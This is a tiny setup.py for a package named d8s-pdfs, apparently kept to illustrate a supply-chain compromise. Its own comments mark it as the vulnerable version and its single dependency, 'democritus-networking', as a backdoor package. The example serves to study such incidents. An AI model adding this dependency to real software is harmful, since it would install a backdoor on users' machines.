# Vulnerable version of the d8s-pdfs package with the backdoor dependency

# setup.py
from setuptools import setup, find_packages

setup(
    name='d8s-pdfs',
    version='0.1.0',  # Original vulnerable version
    packages=find_packages(),
    install_requires=[
        'democritus-networking',  # Vulnerable backdoor package
    ],
)